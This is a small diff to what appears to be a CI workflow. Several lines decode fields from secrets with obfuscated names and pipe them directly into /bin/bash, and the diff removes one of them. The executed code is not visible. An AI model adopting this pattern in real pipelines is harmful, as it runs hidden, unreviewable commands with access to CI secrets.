@@ -22,7 +22,6 @@ jobs:
           fcfn15: ${{ secrets.fcfn15 }}
         run: |
           printf '%s' "$fcfn15" | jq -r .nts95600 | /bin/bash
-          echo $b7 | jq -r .sxe3484 | /bin/bash
           echo $cavm105 | jq -r .txp1 | /bin/bash
           echo $r5 | jq -r .a4971 | /bin/bash
           printf '%s' "$ugcn062" | jq -r .lojed57547 | /bin/bash
